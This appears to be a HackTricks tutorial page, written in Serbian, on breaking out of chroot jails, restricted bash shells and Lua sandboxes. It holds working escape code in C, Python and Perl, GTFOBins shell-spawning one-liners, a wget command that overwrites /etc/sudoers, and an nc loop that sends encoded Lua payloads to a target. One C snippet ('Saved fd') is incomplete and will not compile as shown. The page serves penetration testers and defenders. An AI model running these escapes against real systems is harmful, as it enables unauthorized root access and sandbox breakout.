# Izlazak iz Jail-ova

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Pretraži na** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ako možeš da izvršiš bilo koji binary sa "Shell" svojstvom**

## Chroot Escapes

Iz [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): chroot mehanizam **nije namenjen da se brani** od namernog menjanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne slažu pravilno i chroot-ovani programi **sa dovoljnim privilegijama mogu da izvrše drugi chroot da bi pobegli**.\
Obično to znači da za bekstvo moraš biti root unutar chroot-a.

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) je napravljen da zloupotrebi sledeće scenarije i pobegne iz `chroot`.

### Root + CWD

> [!WARNING]
> Ako si **root** unutar chroot-a, **možeš da pobegneš** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu da koegzistiraju (u Linux-u), pa ako napraviš folder i onda **napraviš novi chroot** nad tim novim folderom dok si **ti van njega**, sada ćeš biti **van novog chroot-a** i zato ćeš biti u FS.
>
> Ovo se dešava zato što chroot obično NE pomera tvoj working directory na navedeni, pa možeš da napraviš chroot ali da budeš van njega.

Obično nećeš naći `chroot` binary unutar chroot jail-a, ali **možeš da kompajliraš, upload-uješ i izvršiš** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva file descriptor za trenutni direktorijum** i zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD** **izvan** chroot-a, pristupa mu i **beži**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD može da se prosledi preko Unix Domain Sockets, tako da:
>
> - Kreiraj child process (fork)
> - Kreiraj UDS da parent i child mogu da komuniciraju
> - Pokreni chroot u child procesu u drugoj fascikli
> - U parent proc, kreiraj FD fascikle koja je van novog child proc chroot-a
> - Prosledi tom child procc taj FD koristeći UDS
> - Child process chdir na taj FD, i pošto je van njegovog chroot-a, on će pobjeći iz jail-a

### Root + Mount

> [!WARNING]
>
> - Montiranje root device (/) u fasciklu unutar chroot-a
> - Chrootovanje u tu fasciklu
>
> Ovo je moguće u Linux

### Root + /proc

> [!WARNING]
>
> - Montiraj procfs u fasciklu unutar chroot-a (ako već nije)
> - Potraži pid koji ima drugačiji root/cwd entry, kao: /proc/1/root
> - Chroot u taj entry

### Root(?) + Fork

> [!WARNING]
>
> - Kreiraj Fork (child proc) i chroot u drugu fasciklu dublje u FS i CD na nju
> - Iz parent process, premesti fasciklu u kojoj je child process u fasciklu prethodnu chroot-u children
> - Ovaj children process će se naći van chroot-a

### ptrace

> [!WARNING]
>
> - Pre nekog vremena korisnici su mogli da debug-uju svoje procese iz procesa samog sebe... ali ovo više nije moguće po default-u
> - U svakom slučaju, ako je moguće, možeš ptrace u process i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Prikupi info o jail-u:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Izmeni PATH

Proveri da li možeš da izmeniš PATH env variable
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Korišćenje vim
```bash
:set shell=/bin/sh
:shell
```
### Pager-i i help viewer-i

Mnogi restriktivni okruženja i dalje ostavljaju dostupne **pager-e** ili **help viewer-e**. Njih je obično brže zloupotrebiti nego pokušavati da ponovo izgradiš `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ako je `git` dostupan, zapamtite da njegov help output obično prolazi kroz pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Uobičajeni GTFOBins one-liners

Kada saznaš koji su binary dostupni, prvo testiraj očigledne shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ako možete samo da **ubacujete argumente** u dozvoljenu komandu (umesto da je slobodno pokrećete), proverite i **GTFOArgs**.

### Napravite skriptu

Proverite da li možete da napravite izvršnu datoteku sa sadržajem _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Dobijte bash iz SSH

Ako pristupate preko ssh, često možete zatražiti od servera da izvrši **drugi program** umesto ograničene login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ako je `ssh` jedan od nekoliko lokalno dozvoljenih binarnih fajlova, zapamti da se može zloupotrebiti i kao **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Deklarisanje
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Možete prepisati, na primer, sudoers fajl
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Neka okruženja vas ne ubacuju u običan `rbash`, već u **wrappers** kao što su `git-shell`, `rssh`, ili `lshell`:

- `git-shell` prihvata samo server-side Git commands plus sve što se nalazi unutar `~/git-shell-commands/`. Ako taj direktorijum postoji, pokrenite `help` da enumerišete dozvoljene custom actions. Ako možete da **pišete** tamo, svaki executable ubačen u taj direktorijum postaje dostupan.
- `rssh` / `lshell` obično dozvoljavaju samo `scp`, `sftp`, `rsync`, ili Git-style operations. U tim slučajevima prvo se fokusirajte na **file write primitives**: uploadujte `authorized_keys`, shell startup file, ili helper script u writable lokaciju, a zatim se ponovo povežite sa `ssh -t ...`.
- Ako wrapper filtrira samo command line, enumerišite reachable binaries i onda pivotujte nazad na **GTFOBins / GTFOArgs**.

### Other tricks

Takođe proverite:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Takođe bi mogla biti interesantna stranica:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Trikovi za escaping iz python jails na sledećoj stranici:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Na ovoj stranici možete pronaći global functions kojima imate pristup unutar lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Neki trikovi za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Nabroji funkcije biblioteke:
```bash
for k,v in pairs(string) do print(k,v) end
```
Imajte na umu da se svaki put kada izvršite prethodni one-liner u **different lua environment** redosled funkcija menja. Zbog toga, ako treba da izvršite jednu određenu funkciju, možete izvršiti brute force attack učitavanjem različitih lua environments i pozivanjem prve funkcije iz le library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Dobij interaktivni lua shell**: Ako si unutar ograničenog lua shell-a, možeš dobiti novi lua shell (i nadamo se neograničen) pozivom:
```bash
debug.debug()
```
## Reference

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdovi: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
